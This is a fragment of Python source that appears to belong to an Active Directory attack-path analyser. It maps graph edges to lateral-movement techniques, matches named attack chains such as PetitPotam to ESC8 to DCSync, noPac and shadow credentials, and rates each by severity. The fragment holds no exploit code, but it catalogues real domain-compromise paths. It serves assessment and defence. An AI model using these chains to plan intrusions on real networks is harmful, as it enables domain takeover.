        _EDGE_TO_TECHNIQUE.setdefault(_et, []).append(_tid)

_CHAINS: list[dict] = [
    {
        "chain_id": "PETITPOTAM_ESC8_DA",
        "name": "PetitPotam → ESC8 → DA Certificate → DCSync",
        "mitre_ids": ["T1557.001", "T1649", "T1003.006"],
        "required": {"PETITPOTAM_ADCS_ESC8"},
        "severity": "CRITICAL",
    },
    {
        "chain_id": "NOPAC_DCSYNC",
        "name": "noPac sAMAccountName Spoof → DCSync",
        "mitre_ids": ["T1558.001", "T1003.006"],
        "required": {"NOPAC"},
        "severity": "CRITICAL",
    },
    {
        "chain_id": "WEBCLIENT_RBCD_LM",
        "name": "WebClient NTLM Relay → RBCD → S4U2Proxy → Lateral Movement",
        "mitre_ids": ["T1557.001", "T1558.001"],
        "required": {"WEBCLIENT_NTLM_RELAY", "S4U_DELEGATION"},
        "severity": "HIGH",
    },
    {
        "chain_id": "SHADOW_CRED_PKINIT",
        "name": "Shadow Credentials → PKINIT → NT Hash → PTH",
        "mitre_ids": ["T1558.004", "T1550.002"],
        "required": {"SHADOW_CREDENTIALS_CHAIN", "PTH"},
        "severity": "HIGH",
    },
    {
        "chain_id": "GPO_MASS_EXEC",
        "name": "GPO Write → Domain-Wide Code Execution",
        "mitre_ids": ["T1484.001"],
        "required": {"GPO_EXEC"},
        "severity": "CRITICAL",
    },
    {
        "chain_id": "ADCS_ESC1_DA",
        "name": "ESC1 Certificate Abuse → PKINIT TGT → DA",
        "mitre_ids": ["T1649", "T1550.004"],
        "required": {"ADCS_ESC1_CERT_ABUSE", "PKINIT_CERT"},
        "severity": "CRITICAL",
    },
    {
        "chain_id": "LAPS_PTH_PIVOT",
        "name": "LAPS Read → Local Admin PTH → Network Pivot",
        "mitre_ids": ["T1552.002", "T1550.002"],
        "required": {"LAPS_PASSWORD_READ", "PTH"},
        "severity": "HIGH",
    },
    {
        "chain_id": "AADCONNECT_FULL_COMPROMISE",
        "name": "AADConnect PwSync → DCSync → Full AD Compromise",
        "mitre_ids": ["T1003.006"],
        "required": {"AADCONNECT_PWSYNC"},
        "severity": "CRITICAL",
    },
]


def detect_lm_techniques(
    edges: list[dict],
    paths: list[dict],
) -> list[dict]:
    edge_types_present = {e.get("edge_type", "") for e in edges}
    # also collect from paths
    for p in paths:
        for step in p.get("steps", []):
            edge_types_present.add(step.get("edge_type", ""))

    edge_types_present &= LM_EDGE_TYPES

    seen: set[str] = set()
    results: list[dict] = []

    for etype in edge_types_present:
        for tech_id in _EDGE_TO_TECHNIQUE.get(etype, []):
            if tech_id not in seen:
                seen.add(tech_id)
                cat = LM_TECHNIQUE_CATALOGUE[tech_id]
                results.append({
                    "technique_id": tech_id,
                    "name": cat["name"],
                    "mitre_id": cat["mitre_id"],
                    "cve": cat.get("cve"),
                    "tier": cat["tier"],
                    "severity": _lm_severity(tech_id),
                    "attack_steps": cat["attack_steps"],
                    "remediation_steps": cat["remediation_steps"],
                    "opsec_notes": cat["opsec_notes"],
                    "edge_types": list(cat["edge_types"]),
                })

    return results


def match_chains(techniques: list[dict]) -> list[dict]:
    detected_ids = {t["technique_id"] for t in techniques}
    matched = []
    for chain in _CHAINS:
        if chain["required"].issubset(detected_ids):
            matched.append({
                "chain_id": chain["chain_id"],
                "name": chain["name"],
                "mitre_ids": chain["mitre_ids"],
                "severity": chain["severity"],
                "techniques": list(chain["required"]),
            })
    return matched


def summarise_lm(edges: list[dict], paths: list[dict]) -> dict:
    techniques = detect_lm_techniques(edges, paths)
    chains = match_chains(techniques)
    coercion_types = {"PETITPOTAM", "PRINTSPOOLER", "SHADOWCOERCE", "DFSCOERCE", "WEBDAV_COERCE", "COERCION"}
    coercion_count = sum(1 for e in edges if e.get("edge_type") in coercion_types)
    return {
        "total_paths": len(paths),
        "techniques_detected": len(techniques),
        "coercion_vectors": coercion_count,
        "critical_chains": len([c for c in chains if c["severity"] == "CRITICAL"]),
        "chains": chains,
        "techniques": techniques,
    }


_LM_SEVERITY: dict[str, str] = {
    "PETITPOTAM_ADCS_ESC8": "CRITICAL",
    "NOPAC": "CRITICAL",
    "AADCONNECT_PWSYNC": "CRITICAL",
    "GPO_EXEC": "CRITICAL",
    "ADCS_ESC1_CERT_ABUSE": "CRITICAL",
    "ADCS_ESC8_RELAY": "CRITICAL",
    "PTH": "HIGH",
    "PTT": "HIGH",
    "PKINIT_CERT": "HIGH",
    "OVERPASS_THE_HASH": "HIGH",
    "SHADOW_CREDENTIALS_CHAIN": "HIGH",
    "S4U_DELEGATION": "HIGH",
    "LAPS_PASSWORD_READ": "HIGH",
    "GMSA_PASSWORD_READ": "HIGH",
    "WEBCLIENT_NTLM_RELAY": "HIGH",
    "KRBRELAYUP": "HIGH",
    "CERTIFRIED": "HIGH",
    "ADCS_ESC6_ALTNAME": "HIGH",
    "ADCS_ESC11_ICPR": "HIGH",
    "ADCS_ESC13_OID": "HIGH",
    "MSSQL_LINKED_SERVER": "MEDIUM",
    "MSSQL_CLR_EXEC": "HIGH",
    "SCCM_NAA_EXTRACTION": "HIGH",
    "DFSCOERCE_RELAY": "MEDIUM",
    "SHADOWCOERCE_RELAY": "MEDIUM",
    "PRINTSPOOLER_COERCE": "HIGH",
    "DNS_ADMIN_DLL": "HIGH",
    "ADIDNS_RELAY_SETUP": "MEDIUM",
    "WMI_EXEC": "MEDIUM",
    "DCOM_EXEC": "MEDIUM",
    "SCM_EXEC": "MEDIUM",
    "RDP_HIJACK": "MEDIUM",
    "REGISTRY_EXEC": "LOW",
    "POISONING_LLMNR": "HIGH",
    "HIVENIGHTMARE": "HIGH",
    "PRINTNIGHTMARE_LPE": "HIGH",
    "SEIMPERSONATE_GODPOTATO": "HIGH",
    "ADCS_ESC7_OFFICER": "HIGH",
    "ADCS_ESC9_NOUPDATE": "HIGH",
    "ADCS_ESC10_WEAKBIND": "HIGH",
}


def _lm_severity(technique_id: str) -> str:
    return _LM_SEVERITY.get(technique_id, "MEDIUM")
